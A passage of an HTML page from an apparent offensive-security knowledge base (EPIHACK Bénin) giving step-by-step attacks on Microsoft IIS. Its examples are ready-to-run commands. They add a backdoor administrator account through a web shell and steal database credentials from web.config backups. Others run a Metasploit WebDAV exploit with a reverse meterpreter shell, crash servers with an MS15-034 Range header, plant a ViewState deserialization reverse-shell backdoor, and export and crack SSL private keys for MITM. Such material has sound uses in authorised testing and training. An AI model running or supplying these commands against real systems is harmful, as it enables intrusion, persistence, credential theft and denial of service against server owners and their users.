</span><span id="__span-47-13"><a id="__codelineno-47-13" name="__codelineno-47-13" href="#__codelineno-47-13"></a><span class="c1"># Output: nt authority\iis apppool\defaultapppool</span>
</span><span id="__span-47-14"><a id="__codelineno-47-14" name="__codelineno-47-14" href="#__codelineno-47-14"></a>
</span><span id="__span-47-15"><a id="__codelineno-47-15" name="__codelineno-47-15" href="#__codelineno-47-15"></a><span class="c1"># Step 5: Escalate privileges or pivot</span>
</span><span id="__span-47-16"><a id="__codelineno-47-16" name="__codelineno-47-16" href="#__codelineno-47-16"></a>curl<span class="w"> </span><span class="s2">&quot;http://target.com/shell.aspx?cmd=net user hacker Pass123! /add&quot;</span>
</span><span id="__span-47-17"><a id="__codelineno-47-17" name="__codelineno-47-17" href="#__codelineno-47-17"></a>curl<span class="w"> </span><span class="s2">&quot;http://target.com/shell.aspx?cmd=net localgroup administrators hacker /add&quot;</span>
</span></code></pre></div>
</details>
<details class="example">
<summary>Example 3: Extracting Database Credentials from web.config</summary>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="c1"># Step 1: Attempt to access web.config directly (usually blocked)</span>
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>curl<span class="w"> </span>http://target.com/web.config
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="c1"># Response: 404 or 403 (IIS blocks by default)</span>
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="c1"># Step 2: Try backup files</span>
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>curl<span class="w"> </span>http://target.com/web.config.bak
</span><span id="__span-48-7"><a id="__codelineno-48-7" name="__codelineno-48-7" href="#__codelineno-48-7"></a>curl<span class="w"> </span>http://target.com/web.config~
</span><span id="__span-48-8"><a id="__codelineno-48-8" name="__codelineno-48-8" href="#__codelineno-48-8"></a>curl<span class="w"> </span>http://target.com/Web.Config.old
</span><span id="__span-48-9"><a id="__codelineno-48-9" name="__codelineno-48-9" href="#__codelineno-48-9"></a>
</span><span id="__span-48-10"><a id="__codelineno-48-10" name="__codelineno-48-10" href="#__codelineno-48-10"></a><span class="c1"># Step 3: If accessible, extract credentials</span>
</span><span id="__span-48-11"><a id="__codelineno-48-11" name="__codelineno-48-11" href="#__codelineno-48-11"></a><span class="c1"># Look for:</span>
</span><span id="__span-48-12"><a id="__codelineno-48-12" name="__codelineno-48-12" href="#__codelineno-48-12"></a><span class="c1"># &lt;connectionStrings&gt;</span>
</span><span id="__span-48-13"><a id="__codelineno-48-13" name="__codelineno-48-13" href="#__codelineno-48-13"></a><span class="c1">#   &lt;add name=&quot;DefaultConnection&quot; </span>
</span><span id="__span-48-14"><a id="__codelineno-48-14" name="__codelineno-48-14" href="#__codelineno-48-14"></a><span class="c1">#        connectionString=&quot;Server=sql.internal;Database=webapp;User Id=sa;Password=P@ssw0rd123;&quot; /&gt;</span>
</span><span id="__span-48-15"><a id="__codelineno-48-15" name="__codelineno-48-15" href="#__codelineno-48-15"></a><span class="c1"># &lt;/connectionStrings&gt;</span>
</span><span id="__span-48-16"><a id="__codelineno-48-16" name="__codelineno-48-16" href="#__codelineno-48-16"></a>
</span><span id="__span-48-17"><a id="__codelineno-48-17" name="__codelineno-48-17" href="#__codelineno-48-17"></a><span class="c1"># Step 4: Use credentials to access database</span>
</span><span id="__span-48-18"><a id="__codelineno-48-18" name="__codelineno-48-18" href="#__codelineno-48-18"></a>mssqlclient.py<span class="w"> </span>sa:P@ssw0rd123@sql.internal
</span><span id="__span-48-19"><a id="__codelineno-48-19" name="__codelineno-48-19" href="#__codelineno-48-19"></a>
</span><span id="__span-48-20"><a id="__codelineno-48-20" name="__codelineno-48-20" href="#__codelineno-48-20"></a><span class="c1"># Step 5: Extract sensitive data or escalate</span>
</span></code></pre></div>
</details>
<details class="example">
<summary>Example 4: IIS 6.0 WebDAV Buffer Overflow (CVE-2017-7269)</summary>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="c1"># Using Metasploit</span>
</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a>msfconsole
</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a>use<span class="w"> </span>exploit/windows/iis/iis_webdav_scstoragepathfromurl
</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="nb">set</span><span class="w"> </span>RHOST<span class="w"> </span><span class="m">192</span>.168.1.100
</span><span id="__span-49-5"><a id="__codelineno-49-5" name="__codelineno-49-5" href="#__codelineno-49-5"></a><span class="nb">set</span><span class="w"> </span>RPORT<span class="w"> </span><span class="m">80</span>
</span><span id="__span-49-6"><a id="__codelineno-49-6" name="__codelineno-49-6" href="#__codelineno-49-6"></a><span class="nb">set</span><span class="w"> </span>TARGETURI<span class="w"> </span>/
</span><span id="__span-49-7"><a id="__codelineno-49-7" name="__codelineno-49-7" href="#__codelineno-49-7"></a><span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
</span><span id="__span-49-8"><a id="__codelineno-49-8" name="__codelineno-49-8" href="#__codelineno-49-8"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.1.50
</span><span id="__span-49-9"><a id="__codelineno-49-9" name="__codelineno-49-9" href="#__codelineno-49-9"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
</span><span id="__span-49-10"><a id="__codelineno-49-10" name="__codelineno-49-10" href="#__codelineno-49-10"></a>exploit
</span><span id="__span-49-11"><a id="__codelineno-49-11" name="__codelineno-49-11" href="#__codelineno-49-11"></a>
</span><span id="__span-49-12"><a id="__codelineno-49-12" name="__codelineno-49-12" href="#__codelineno-49-12"></a><span class="c1"># Expected result: Meterpreter shell with SYSTEM privileges</span>
</span><span id="__span-49-13"><a id="__codelineno-49-13" name="__codelineno-49-13" href="#__codelineno-49-13"></a><span class="c1"># This vulnerability is critical and widely exploited</span>
</span><span id="__span-49-14"><a id="__codelineno-49-14" name="__codelineno-49-14" href="#__codelineno-49-14"></a><span class="c1"># Only affects IIS 6.0 on Windows Server 2003 R2</span>
</span></code></pre></div>
</details>
<details class="example">
<summary>Example 5: HTTP.sys Range Header DoS/RCE (MS15-034)</summary>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="c1"># Test for vulnerability</span>
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>curl<span class="w"> </span>-I<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Range: bytes=0-18446744073709551615&quot;</span><span class="w"> </span>http://target.com/
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>
</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="c1"># Vulnerable response:</span>
</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="c1"># HTTP/1.1 416 Requested Range Not Satisfiable</span>
</span><span id="__span-50-6"><a id="__codelineno-50-6" name="__codelineno-50-6" href="#__codelineno-50-6"></a>
</span><span id="__span-50-7"><a id="__codelineno-50-7" name="__codelineno-50-7" href="#__codelineno-50-7"></a><span class="c1"># Not vulnerable response:</span>
</span><span id="__span-50-8"><a id="__codelineno-50-8" name="__codelineno-50-8" href="#__codelineno-50-8"></a><span class="c1"># HTTP/1.1 200 OK (or other non-416 response)</span>
</span><span id="__span-50-9"><a id="__codelineno-50-9" name="__codelineno-50-9" href="#__codelineno-50-9"></a>
</span><span id="__span-50-10"><a id="__codelineno-50-10" name="__codelineno-50-10" href="#__codelineno-50-10"></a><span class="c1"># For DoS (Blue Screen of Death)</span>
</span><span id="__span-50-11"><a id="__codelineno-50-11" name="__codelineno-50-11" href="#__codelineno-50-11"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;Range: bytes=18-18446744073709551615&quot;</span><span class="w"> </span>http://target.com/welcome.png
</span><span id="__span-50-12"><a id="__codelineno-50-12" name="__codelineno-50-12" href="#__codelineno-50-12"></a>
</span><span id="__span-50-13"><a id="__codelineno-50-13" name="__codelineno-50-13" href="#__codelineno-50-13"></a><span class="c1"># Causes system crash on vulnerable systems</span>
</span><span id="__span-50-14"><a id="__codelineno-50-14" name="__codelineno-50-14" href="#__codelineno-50-14"></a><span class="c1"># Can be used for RCE with more sophisticated exploitation</span>
</span></code></pre></div>
</details>
<details class="example">
<summary>Example 6: ASP.NET ViewState Deserialization Attack</summary>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="c1"># Prerequisites:</span>
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="c1"># - ViewState MAC validation disabled: enableViewStateMac=&quot;false&quot;</span>
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="c1"># - Or: known machineKey</span>
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>
</span><span id="__span-51-5"><a id="__codelineno-51-5" name="__codelineno-51-5" href="#__codelineno-51-5"></a><span class="c1"># Step 1: Generate malicious ViewState with ysoserial.net</span>
</span><span id="__span-51-6"><a id="__codelineno-51-6" name="__codelineno-51-6" href="#__codelineno-51-6"></a>ysoserial.exe<span class="w"> </span>-o<span class="w"> </span>base64<span class="w"> </span>-g<span class="w"> </span>TypeConfuseDelegate<span class="w"> </span><span class="se">\</span>
</span><span id="__span-51-7"><a id="__codelineno-51-7" name="__codelineno-51-7" href="#__codelineno-51-7"></a><span class="w">              </span>-f<span class="w"> </span>ObjectStateFormatter<span class="w"> </span><span class="se">\</span>
</span><span id="__span-51-8"><a id="__codelineno-51-8" name="__codelineno-51-8" href="#__codelineno-51-8"></a><span class="w">              </span>-c<span class="w"> </span><span class="s2">&quot;cmd.exe /c whoami &gt; C:\inetpub\wwwroot\output.txt&quot;</span>
</span><span id="__span-51-9"><a id="__codelineno-51-9" name="__codelineno-51-9" href="#__codelineno-51-9"></a>
</span><span id="__span-51-10"><a id="__codelineno-51-10" name="__codelineno-51-10" href="#__codelineno-51-10"></a><span class="c1"># Step 2: Inject into __VIEWSTATE parameter</span>
</span><span id="__span-51-11"><a id="__codelineno-51-11" name="__codelineno-51-11" href="#__codelineno-51-11"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target.com/page.aspx<span class="w"> </span><span class="se">\</span>
</span><span id="__span-51-12"><a id="__codelineno-51-12" name="__codelineno-51-12" href="#__codelineno-51-12"></a><span class="w">     </span>-d<span class="w"> </span><span class="s2">&quot;__VIEWSTATE=[malicious_base64_payload]&amp;__VIEWSTATEGENERATOR=CA0B0334&quot;</span>
</span><span id="__span-51-13"><a id="__codelineno-51-13" name="__codelineno-51-13" href="#__codelineno-51-13"></a>
</span><span id="__span-51-14"><a id="__codelineno-51-14" name="__codelineno-51-14" href="#__codelineno-51-14"></a><span class="c1"># Step 3: Verify code execution</span>
</span><span id="__span-51-15"><a id="__codelineno-51-15" name="__codelineno-51-15" href="#__codelineno-51-15"></a>curl<span class="w"> </span>http://target.com/output.txt
</span><span id="__span-51-16"><a id="__codelineno-51-16" name="__codelineno-51-16" href="#__codelineno-51-16"></a><span class="c1"># Output: domain\apppool_identity</span>
</span><span id="__span-51-17"><a id="__codelineno-51-17" name="__codelineno-51-17" href="#__codelineno-51-17"></a>
</span><span id="__span-51-18"><a id="__codelineno-51-18" name="__codelineno-51-18" href="#__codelineno-51-18"></a><span class="c1"># Step 4: Deploy persistent backdoor</span>
</span><span id="__span-51-19"><a id="__codelineno-51-19" name="__codelineno-51-19" href="#__codelineno-51-19"></a>ysoserial.exe<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;powershell -enc [base64_reverse_shell]&quot;</span>
</span></code></pre></div>
</details>
<details class="example">
<summary>Example 7: Stealing SSL Certificate Private Keys</summary>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="c"># If you have remote code execution on IIS server</span>
</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>
</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a><span class="c"># Step 1: List installed certificates</span>
</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">Cert</span><span class="p">:\</span><span class="n">LocalMachine</span><span class="p">\</span><span class="n">My</span>
</span><span id="__span-52-5"><a id="__codelineno-52-5" name="__codelineno-52-5" href="#__codelineno-52-5"></a>
</span><span id="__span-52-6"><a id="__codelineno-52-6" name="__codelineno-52-6" href="#__codelineno-52-6"></a><span class="c"># Step 2: Export certificate with private key (requires admin)</span>
</span><span id="__span-52-7"><a id="__codelineno-52-7" name="__codelineno-52-7" href="#__codelineno-52-7"></a><span class="c"># Using PowerShell</span>
</span><span id="__span-52-8"><a id="__codelineno-52-8" name="__codelineno-52-8" href="#__codelineno-52-8"></a><span class="nv">$cert</span> <span class="p">=</span> <span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">Cert</span><span class="p">:\</span><span class="n">LocalMachine</span><span class="p">\</span><span class="n">My</span><span class="p">\</span><span class="no">[Thumbprint]</span>
</span><span id="__span-52-9"><a id="__codelineno-52-9" name="__codelineno-52-9" href="#__codelineno-52-9"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="n">-String</span> <span class="s2">&quot;ExportPassword123&quot;</span> <span class="n">-Force</span> <span class="n">-AsPlainText</span>
</span><span id="__span-52-10"><a id="__codelineno-52-10" name="__codelineno-52-10" href="#__codelineno-52-10"></a><span class="nb">Export-PfxCertificate</span> <span class="n">-Cert</span> <span class="nv">$cert</span> <span class="n">-FilePath</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Temp</span><span class="p">\</span><span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-Password</span> <span class="nv">$password</span>
</span><span id="__span-52-11"><a id="__codelineno-52-11" name="__codelineno-52-11" href="#__codelineno-52-11"></a>
</span><span id="__span-52-12"><a id="__codelineno-52-12" name="__codelineno-52-12" href="#__codelineno-52-12"></a><span class="c"># Step 3: Download the certificate</span>
</span><span id="__span-52-13"><a id="__codelineno-52-13" name="__codelineno-52-13" href="#__codelineno-52-13"></a><span class="c"># Use your web shell or transfer method</span>
</span><span id="__span-52-14"><a id="__codelineno-52-14" name="__codelineno-52-14" href="#__codelineno-52-14"></a>
</span><span id="__span-52-15"><a id="__codelineno-52-15" name="__codelineno-52-15" href="#__codelineno-52-15"></a><span class="c"># Step 4: Crack the password (if needed) using pfx2john</span>
</span><span id="__span-52-16"><a id="__codelineno-52-16" name="__codelineno-52-16" href="#__codelineno-52-16"></a><span class="n">pfx2john</span> <span class="n">cert</span><span class="p">.</span><span class="n">pfx</span> <span class="p">&gt;</span> <span class="n">cert</span><span class="p">.</span><span class="n">hash</span>
</span><span id="__span-52-17"><a id="__codelineno-52-17" name="__codelineno-52-17" href="#__codelineno-52-17"></a><span class="n">john</span> <span class="n">cert</span><span class="p">.</span><span class="n">hash</span> <span class="p">-</span><span class="n">-wordlist</span><span class="p">=</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span>
</span><span id="__span-52-18"><a id="__codelineno-52-18" name="__codelineno-52-18" href="#__codelineno-52-18"></a>
</span><span id="__span-52-19"><a id="__codelineno-52-19" name="__codelineno-52-19" href="#__codelineno-52-19"></a><span class="c"># Step 5: Import and use certificate for MITM attacks</span>
</span></code></pre></div>
</details>
<hr />
<h2 id="metadata">Metadata<a class="headerlink" href="#metadata" title="Permanent link">&para;</a></h2>
<ul>
<li><strong>Template version:</strong> 1.0</li>
<li><strong>Last updated:</strong> January 2026</li>
<li><strong>Contributor:</strong> Laurince AGANI / Epihack BÃ©nin</li>
<li><strong>Sources verified:</strong> Yes</li>
</ul>









  



  <form class="md-feedback" name="feedback" hidden>
    <fieldset>
      <legend class="md-feedback__title">
        Was this page helpful?
      </legend>
      <div class="md-feedback__inner">
        <div class="md-feedback__list">
          
            <button class="md-feedback__icon md-icon" type="submit" title="Very helpful" data-md-value="1">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m7 0c0 .8-.7 1.5-1.5 1.5S14 10.3 14 9.5 14.7 8 15.5 8s1.5.7 1.5 1.5m-5 7.73c-1.75 0-3.29-.73-4.19-1.81L9.23 14c.45.72 1.52 1.23 2.77 1.23s2.32-.51 2.77-1.23l1.42 1.42c-.9 1.08-2.44 1.81-4.19 1.81"/></svg>
            </button>
          
            <button class="md-feedback__icon md-icon" type="submit" title="Could be improved" data-md-value="0">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 12a8 8 0 0 0-8-8 8 8 0 0 0-8 8 8 8 0 0 0 8 8 8 8 0 0 0 8-8m2 0a10 10 0 0 1-10 10A10 10 0 0 1 2 12 10 10 0 0 1 12 2a10 10 0 0 1 10 10m-6.5-4c.8 0 1.5.7 1.5 1.5s-.7 1.5-1.5 1.5-1.5-.7-1.5-1.5.7-1.5 1.5-1.5M10 9.5c0 .8-.7 1.5-1.5 1.5S7 10.3 7 9.5 7.7 8 8.5 8s1.5.7 1.5 1.5m2 4.5c1.75 0 3.29.72 4.19 1.81l-1.42 1.42C14.32 16.5 13.25 16 12 16s-2.32.5-2.77 1.23l-1.42-1.42C8.71 14.72 10.25 14 12 14"/></svg>
            </button>
          
        </div>
        <div class="md-feedback__note">
          
            <div data-md-value="1" hidden>
              
              
                
              
              
              
                
                
              
              Thank you for your feedback!
            </div>
          
            <div data-md-value="0" hidden>
              
              
                
              
              
              
                
                
              
              Thanks! Help us improve this page by opening an issue on GitHub.
            </div>
          
        </div>
      </div>
    </fieldset>
  </form>


                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
      
      <nav class="md-footer__inner md-grid" aria-label="Footer" >
        
          
          <a href="../nginx/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Nginx">
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
            </div>
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Previous
              </span>
              <div class="md-ellipsis">
                Nginx
              </div>
            </div>
          </a>
        
        
          
          <a href="../../databases/" class="md-footer__link md-footer__link--next" aria-label="Next: ðŸ—„ï¸ Databases">
            <div class="md-footer__title">
              <span class="md-footer__direction">
                Next
              </span>
              <div class="md-ellipsis">
                ðŸ—„ï¸ Databases
              </div>
            </div>
            <div class="md-footer__button md-icon">
              
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
            </div>
          </a>
        
      </nav>
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
    <div class="md-copyright__highlight">
      Copyright Â© 2025 EPIHACK - MIT License
    </div>
  
  
</div>
      
        
<div class="md-social">
  
    
    
    
    
    <a href="https://github.com/EPIHACKBENIN" target="_blank" rel="noopener" title="EPIHACK on GitHub" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
    </a>
  
    
    
    
    
    <a href="mailto:epihack.benin@gmail.com" target="_blank" rel="noopener" title="Contact us" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M48 64C21.5 64 0 85.5 0 112c0 15.1 7.1 29.3 19.2 38.4l208 156a48 48 0 0 0 57.6 0l208-156c12.1-9.1 19.2-23.3 19.2-38.4 0-26.5-21.5-48-48-48zM0 196v188c0 35.3 28.7 64 64 64h384c35.3 0 64-28.7 64-64V196L313.6 344.8c-34.1 25.6-81.1 25.6-115.2 0z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["announce.dismiss", "content.action.edit", "content.action.view", "content.code.annotate", "content.code.copy", "content.tooltips", "navigation.footer", "navigation.indexes", "navigation.instant", "navigation.instant.prefetch", "navigation.instant.progress", "navigation.path", "navigation.sections", "navigation.tabs", "navigation.tabs.sticky", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
        <script src="../../../javascripts/extra.js"></script>
      
    
  </body>
</html>